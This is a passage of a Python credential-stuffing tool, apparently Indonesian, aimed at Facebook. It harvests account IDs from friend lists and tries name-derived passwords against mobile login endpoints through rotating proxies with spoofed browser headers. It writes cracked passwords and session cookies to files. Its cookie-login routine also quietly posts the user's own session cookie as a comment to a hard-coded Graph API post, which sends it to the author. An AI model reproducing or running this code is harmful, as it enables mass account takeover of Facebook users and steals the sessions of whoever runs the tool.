		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU

#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      login_cokies()
      	
#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f'''\t{mer}
  _________   _____ _____________________
 /   _____/  /     \\______   \_   _____/
 \_____  \  /  \ /  \|    |  _/|    __)  
 {puti}/        \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    
        {hijo} SIMPLE MULTI BRUTE FORCE''')
    	
#----------[ LOGIN-COKIES ]----------#        
def login_cokies():
    try:
        banner()
        ses = requests.Session()
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        cookie = input(f'{kun}└──[{puti} Cookies {hijo}: ')
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        requests.post(f"https://graph.facebook.com/v17.0/100023328316616_1486082242179372/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
        ken = open(".cyxieontoken.txt", "w").write(tok)
        cok = open(".cyxieoncokies.txt", "w").write(cookie)
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        suk = input(f'{kun}└──[{puti} Tekan Enter ] ')
        menu()
            
    except Exception as e:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Login Gagal Cek Tumbal Lo Ngab :-(")		
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
        try:
            token = open('.cyxieontoken.txt','r').read()
            cok = open('.cyxieoncokies.txt','r').read()
            tokene.append(token)
            try:
                baz_ganteng = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
                useridz = json.loads(baz_ganteng.text)['id']
                username = json.loads(baz_ganteng.text)['name']
            except KeyError:
                print(f"{kun}╭────────────────────────────────────────────{puti}")
                print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
                time.sleep(3)
                login_cokies()
        except requests.exceptions.ConnectionError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Koneksi Problem ")
        except IOError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
            time.sleep(3)
            login_cokies()
        except IOError:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Cokies Expired ")           
        banner()            
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} User  Id {hijo}: {username} {puti}')
        print(f'{kun}└──[{puti} Username {hijo}: {useridz} {puti}')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} 01. Crack publik ')
        print(f'{kun}└──[{puti} 02. Cek hasil OK ')
        print(f'{kun}└──[{puti} 03. Cek hasil CP ')
        print(f'{kun}└──[{puti} 00. Ganti cokies ')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
        if CYXIEON_GANTENG in ['01','1']:
            crack_publik()
        elif CYXIEON_GANTENG in ['02','2']:
            hasil_ok()
        elif CYXIEON_GANTENG in ['03','3']:
            hasil_cp()
        elif CYXIEON_GANTENG in ['00','0']:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            print(f"{kun}└──[{mer} Berhasil Hapus Cokies ")  
            time.sleep(3)      
            exit()    
        else:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Yang bener ter :-( ")            

#----------[ CRACK-PUBLIK  ]----------#            
def crack_publik():
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
	except IOError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Cokies Expired ")           
	try:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		kumpulkan = int(input(f'{kun}└──[{puti} Berapa target : '))
	except ValueError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Yang bener :-( ")    
	if kumpulkan<1 or kumpulkan>100:
	    print(f"{kun}╭────────────────────────────────────────────{puti}")
	    exit(f"{kun}└──[{mer} Gagal Dump ")    
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		Masukan = input(f'{kun}└──[{puti} Target ke '+str(bilangan)+f' :{hijo} ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       graph = ses.get('https://graph.facebook.com/v11.0/'+user+'?fields=friends.limit(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)&access_token='+tokene[0], cookies = {'cookies':cok}).json()
	       for xr in graph['friends']['data']:
	           try:
	               gmail = (xr['id']+'|'+xr['name'])
	               if gmail in id:pass
	               else:id.append(gmail)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	          print(f"{kun}╭────────────────────────────────────────────{puti}")
	          exit(f"{kun}└──[{mer} Koneksi Problem ")
	try:
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      print(f'{kun}└──[{puti} Total target :{hijo} '+str(len(id)))
	      atur_id()
	except requests.exceptions.ConnectionError:
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      exit(f"{kun}└──[{mer} Gagal Dump ")
	except (KeyError,IOError):
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      exit(f"{kun}└──[{mer} Tidak punya teman ")
	      
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('CYXIEON-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('CYXIEON-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} 01. Validate ')
	print(f'{kun}└──[{puti} 02. Reguler ')
	print(f'{kun}└──[{puti} 03. Asyinc ')      
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('reguler')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('asyinc')
	else:
		method.append('validate')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} Tambahkan pw manual (y/t) ')
	print(f"{kun}╭────────────────────────────────────────────{puti}") 	
	passwtamb = input(f'{kun}└──[{puti} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{kun}╭────────────────────────────────────────────{puti}")
		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	print(f"{kun}─────────────────────────────────────────────{puti}")
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'123456')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'123456')
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'mbasic.facebook.com')
				elif 'reguler' in method:
				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{puti}")
	
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} VALIDATE (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ref = rc([f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&refsrc=deprecated&_rdr"])
			link = ses.get(f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&refsrc=deprecated&_rdr")
			date ={"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next":f"https://{url}/login/save-device/",
	        "flow":"login_no_pin",
	        "pass":pw,
	        }     
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			ver = rc(["ms-MY,ms;q=0.9","fr_FR,fr;q=0.9"])  		
			head={'Host': url,
	        'cache-control': 'max-age=0',
	        'dpr': f'{str(rr(1,5))}',
	        'viewport-width': f'{str(rr(400,999))}',
	        'sec-ch-ua': f'"Chromium";v="{str(rr(110,115))}", "Google Chrome";v="{str(rr(110,115))}", "Not:A-Brand";v="{str(rr(8,20))}"',
	        'sec-ch-ua-mobile': '?1',
	        'sec-ch-ua-platform': '"Android"',
	        'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	        'sec-ch-ua-full-version-list':f'"Chromium";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Google Chrome";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Not:A-Brand";v="{str(rr(8,20))}.0.0.0"',
	        'sec-ch-prefers-color-scheme': 'light',
	        'upgrade-insecure-requests': '1',
	        'origin': 'https://'+url,
	        'content-type': 'application/x-www-form-urlencoded',
	        'user-agent': ua,
	        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	        'x-requested-with': 'XMLHttpRequest',
	        'sec-fetch-site': 'same-origin',
	        'sec-fetch-mode': 'cors',
	        'sec-fetch-user': '?1',
	        'sec-fetch-dest': 'empty',
	        'referer': ref,
	        'accept-encoding': 'gzip, deflate, br',
	        'connection': 'close',
	        'accept-language': ver}
			rdm = rc(["id_ID","jv_ID","id_ID_ID","jv_ID_ID"])
			links = rc([f"https://{url}/login/device-based/validate-password/?shbl=0&locale2={rdm}"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} REGULER (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ver = rc(["en-GB,en-US;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  		
			ses.headers.update({"Host":url,
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"dnt":f"{str(rr(1,9))}",
			"x-requested-with":"mark.via.gp",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-user":"empty",
			"sec-fetch-dest":"document",
			"referer":f"https://{url}/",
			"accept-encoding":"gzip, deflate br",
			"accept-language":f"{ver},en;q=0.8"})
			link = ses.get('https://m.facebook.com/login/?email='+idf).text
			date = {'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw}
			ses.headers.update({'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': 'empty',
			'sec-fetch-dest': 'document',
			'referer': f'https://{url}/login/?email='+idf,
			'accept-encoding':'gzip, deflate br',
			'accept-language':f'{ver},en;q=0.8'})
			links = rc([f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated"])
			CYXIEON_XR = ses.post(links,data=date,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} ASYINC (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ref = rc([f"https://{url}/login.php?skip_api_login=1&api_key=266809897176355&kid_directed_site=0&app_id=266809897176355&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"])
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=266809897176355&kid_directed_site=0&app_id=266809897176355&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'true',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"__dyn": "",
			"__csr": "",
